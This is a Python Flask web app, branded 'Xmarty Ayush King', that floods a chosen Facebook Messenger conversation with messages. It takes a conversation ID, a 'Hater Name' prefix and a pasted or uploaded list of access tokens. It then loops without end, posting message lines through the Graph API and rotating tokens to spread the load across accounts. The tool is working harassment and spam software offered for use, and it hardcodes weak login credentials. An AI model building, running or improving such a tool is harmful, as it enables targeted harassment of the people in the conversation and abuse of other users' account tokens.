from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import requests
from threading import Thread, Event
import time
import os
import random
import string
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'change_this_to_a_strong_random_secret_key_123!@#'  # ⚠️ change this

USERNAME = "AYUSH"
PASSWORD = "AYUSH"

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
logs = {}          # task_id -> list of log strings
MAX_LOGS = 200     # keep last 200 logs per task

def add_log(task_id, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    if task_id in logs:
        logs[task_id].append(line)
        if len(logs[task_id]) > MAX_LOGS:
            logs[task_id] = logs[task_id][-MAX_LOGS:]

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    max_tokens = len(access_tokens)
    num_messages = len(messages)

    add_log(task_id, f"🚀 Task started | Tokens: {max_tokens} | Messages: {num_messages} | Interval: {time_interval}s")

    message_index = 0
    sent_ok = 0
    sent_fail = 0

    while not stop_event.is_set():
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = f"{mn} {messages[message_index % num_messages]}"

            parameters = {'access_token': access_token, 'message': message}
            post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            response = requests.post(post_url, json=parameters, headers=headers, timeout=20)

            if response.ok:
                sent_ok += 1
                add_log(task_id, f"✅ Sent: {message[:60]}... | Token {token_index+1} | OK:{sent_ok} FAIL:{sent_fail}")
            else:
                sent_fail += 1
                add_log(task_id, f"❌ Failed: {message[:60]}... | Token {token_index+1} | OK:{sent_ok} FAIL:{sent_fail}")

            message_index += 1
            time.sleep(time_interval)

        except Exception as e:
            add_log(task_id, f"⚠️ Error: {e}")
            time.sleep(5)

    add_log(task_id, f"🛑 Task stopped. Total OK:{sent_ok} FAIL:{sent_fail}")


# ---------------------- LOGIN ----------------------
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        return '<h3 style="color:red;text-align:center;margin-top:50px;">Invalid credentials. <a href="/login">Try again</a></h3>'

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login — Xmarty Ayush King</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
body {
    min-height:100vh; display:flex; align-items:center; justify-content:center;
    background:radial-gradient(circle at 20% 20%, #0a0f1e, #000);
}
.box {
    width:360px; padding:35px; border-radius:18px;
    background:rgba(0,255,140,0.04);
    border:1px solid rgba(0,255,140,0.25);
    box-shadow:0 0 40px rgba(0,255,140,0.15);
    color:#00ff8c;
}
h2 { text-align:center; margin-bottom:25px; letter-spacing:2px; color:#00ff8c; }
input {
    width:100%; padding:12px 15px; margin-bottom:15px;
    background:rgba(0,0,0,0.5); border:1px solid #00ff8c40;
    border-radius:10px; color:#fff; outline:none; font-size:15px;
}
input:focus { border-color:#00ff8c; box-shadow:0 0 10px #00ff8c80; }
button {
    width:100%; padding:12px; border:none; border-radius:10px;
    background:linear-gradient(90deg,#00ff8c,#00c8ff);
    color:#000; font-weight:700; font-size:16px; cursor:pointer;
    letter-spacing:1px;
}
button:hover { box-shadow:0 0 20px #00ff8c; transform:scale(1.02); transition:.2s; }
.note { text-align:center; margin-top:15px; font-size:12px; color:#999; }
</style>
</head>
<body>
    <div class="box">
        <h2>🔐 LOGIN</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">LOGIN</button>
        </form>
        <div class="note">Contact admin for credentials</div>
    </div>
</body>
</html>
'''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


# ---------------------- DASHBOARD ----------------------
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    if request.method == 'POST':
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        # ---- TOKENS: file OR pasted ----
        access_tokens = []
        pasted_tokens = request.form.get('tokensPaste', '').strip()
        txt_file = request.files.get('txtFile')

        if pasted_tokens:
            access_tokens = [t.strip() for t in pasted_tokens.splitlines() if t.strip()]
        elif txt_file and txt_file.filename:
            access_tokens = [t.strip() for t in txt_file.read().decode().strip().splitlines() if t.strip()]

        # ---- MESSAGES: file OR pasted ----
        messages = []
        pasted_msgs = request.form.get('msgsPaste', '').strip()
        messages_file = request.files.get('messagesFile')

        if pasted_msgs:
            messages = [m.strip() for m in pasted_msgs.splitlines() if m.strip()]
        elif messages_file and messages_file.filename:
            messages = [m.strip() for m in messages_file.read().decode().strip().splitlines() if m.strip()]

        if not access_tokens or not messages:
            return '<h3 style="color:red;text-align:center;margin-top:50px;">⚠️ Tokens aur Messages dono chahiye (file ya paste).</h3>'

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        logs[task_id] = []

        thread = Thread(target=send_messages,
                        args=(access_tokens, thread_id, mn, time_interval, messages, task_id),
                        daemon=True)
        threads[task_id] = thread
        thread.start()

        return redirect(url_for('send_message') + f'?task={task_id}')

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XMARTY AYUSH KING — Live Console</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
body {
    min-height:100vh; background:radial-gradient(circle at 30% 10%, #0a1622, #000 70%);
    color:#e0e0e0; padding:20px;
}
.wrap { max-width:1000px; margin:0 auto; }
h1 {
    text-align:center; color:#00ff8c; letter-spacing:3px;
    margin-bottom:20px; font-size:22px;
    text-shadow:0 0 15px #00ff8c80;
}
.card {
    background:rgba(0,255,140,0.03);
    border:1px solid rgba(0,255,140,0.2);
    border-radius:14px; padding:20px; margin-bottom:20px;
    box-shadow:0 0 25px rgba(0,255,140,0.08);
}
label { display:block; font-size:13px; color:#00ff8c; margin-bottom:5px; letter-spacing:1px; }
input, textarea, select {
    width:100%; padding:10px 12px; margin-bottom:12px;
    background:rgba(0,0,0,0.6); border:1px solid #00ff8c40;
    border-radius:8px; color:#fff; outline:none; font-size:14px;
}
input:focus, textarea:focus { border-color:#00ff8c; box-shadow:0 0 10px #00ff8c60; }
textarea { resize:vertical; min-height:80px; font-family:monospace; }
.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; }
.btn {
    width:100%; padding:12px; border:none; border-radius:10px;
    background:linear-gradient(90deg,#00ff8c,#00c8ff);
    color:#000; font-weight:700; font-size:15px; cursor:pointer;
    letter-spacing:1px; transition:.2s;
}
.btn:hover { box-shadow:0 0 20px #00ff8c; transform:scale(1.02); }
.btn-stop {
    background:linear-gradient(90deg,#ff2d55,#ff8a00); color:#000;
}
.btn-stop:hover { box-shadow:0 0 20px #ff2d55; }
.divider { text-align:center; color:#666; margin:8px 0; font-size:12px; }
.console {
    background:#000; border:1px solid #00ff8c40; border-radius:10px;
    padding:12px; height:280px; overflow-y:auto; font-family:'Consolas',monospace;
    font-size:12.5px; color:#00ff8c; white-space:pre-wrap; line-height:1.5;
}
.console::-webkit-scrollbar { width:6px; }
.console::-webkit-scrollbar-thumb { background:#00ff8c60; border-radius:3px; }
.badge {
    display:inline-block; padding:4px 12px; border-radius:20px;
    background:#00ff8c20; color:#00ff8c; font-size:12px;
    border:1px solid #00ff8c60; margin-left:10px;
}
.topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; }
.logout {
    color:#fff; text-decoration:none; padding:8px 18px;
    border-radius:20px; background:linear-gradient(90deg,#ff2d55,#ff8a00);
    font-weight:600; font-size:13px;
}
.footer { text-align:center; color:#555; font-size:12px; margin-top:20px; }
.status-live { color:#00ff8c; font-weight:600; }
</style>
</head>
<body>
<div class="wrap">
    <div class="topbar">
        <h1 style="margin:0;">⚡ XMARTY AYUSH KING — LIVE CONSOLE</h1>
        <a href="/logout" class="logout">LOGOUT</a>
    </div>

    <div class="card">
        <form method="post" enctype="multipart/form-data">
            <div class="grid2">
                <div>
                    <label>Conversation ID</label>
                    <input type="text" name="threadId" placeholder="Enter Conversation ID" required>
                </div>
                <div>
                    <label>Hater Name (Prefix)</label>
                    <input type="text" name="kidx" placeholder="Enter Name" required>
                </div>
            </div>
            <label>Time Interval (seconds)</label>
            <input type="number" name="time" placeholder="e.g. 1" min="1" required>

            <div class="grid2">
                <div>
                    <label>📁 Upload Token File (.txt)</label>
                    <input type="file" name="txtFile" accept=".txt">
                    <div class="divider">— OR —</div>
                    <label>📋 Paste Tokens (one per line)</label>
                    <textarea name="tokensPaste" placeholder="EAAB...token1&#10;EAAB...token2"></textarea>
                </div>
                <div>
                    <label>📁 Upload Messages File (.txt)</label>
                    <input type="file" name="messagesFile" accept=".txt">
                    <div class="divider">— OR —</div>
                    <label>📋 Paste Messages (one per line)</label>
                    <textarea name="msgsPaste" placeholder="Hello&#10;Message 2&#10;Message 3"></textarea>
                </div>
            </div>

            <button type="submit" class="btn">🚀 START TASK</button>
        </form>
    </div>

    <div class="card">
        <form method="post" action="/stop" style="display:flex; gap:10px; align-items:flex-end;">
            <div style="flex:1;">
                <label>Stop Task ID</label>
                <input type="text" name="taskId" placeholder="Enter Task ID to stop" required style="margin-bottom:0;">
            </div>
            <button type="submit" class="btn btn-stop" style="width:180px;">⛔ STOP TASK</button>
        </form>
    </div>

    <div class="card">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
            <label style="margin:0;">🖥️ LIVE CONSOLE <span class="badge" id="statusBadge">WAITING</span></label>
            <span class="status-live" id="taskLabel">No active task</span>
        </div>
        <div class="console" id="console">> Waiting for task to start...</div>
    </div>

    <div class="footer">Made with ❤️ by Xmarty Ayush King</div>
</div>

<script>
const params = new URLSearchParams(window.location.search);
let taskId = params.get('task');
let lastLen = 0;

function setStatus(txt, color) {
    const b = document.getElementById('statusBadge');
    b.textContent = txt;
    b.style.color = color;
    b.style.borderColor = color;
}

if (taskId) {
    document.getElementById('taskLabel').textContent = 'Task: ' + taskId;
    setStatus('LIVE', '#00ff8c');
}

async function poll() {
    if (!taskId) return;
    try {
        const r = await fetch('/logs?task=' + taskId);
        const data = await r.json();
        const box = document.getElementById('console');
        if (data.logs && data.logs.length) {
            if (data.logs.length !== lastLen) {
                box.textContent = data.logs.join('\\n');
                box.scrollTop = box.scrollHeight;
                lastLen = data.logs.length;
            }
        }
        if (data.running === false) {
            setStatus('STOPPED', '#ff2d55');
        }
    } catch(e) {}
    setTimeout(poll, 1000);
}
poll();
</script>
</body>
</html>
    '''

@app.route('/logs')
def get_logs():
    if not session.get('logged_in'):
        return jsonify({'error': 'unauthorized'}), 401
    task_id = request.args.get('task', '')
    if task_id not in logs:
        return jsonify({'logs': [], 'running': False})
    running = task_id in stop_events and not stop_events[task_id].is_set()
    return jsonify({'logs': logs[task_id], 'running': running})

@app.route('/stop', methods=['POST'])
def stop_task():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        add_log(task_id, "⛔ Stop signal received by user.")
        return redirect(url_for('send_message') + f'?task={task_id}')
    return '<h3 style="color:red;text-align:center;margin-top:50px;">No task found with that ID.</h3>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
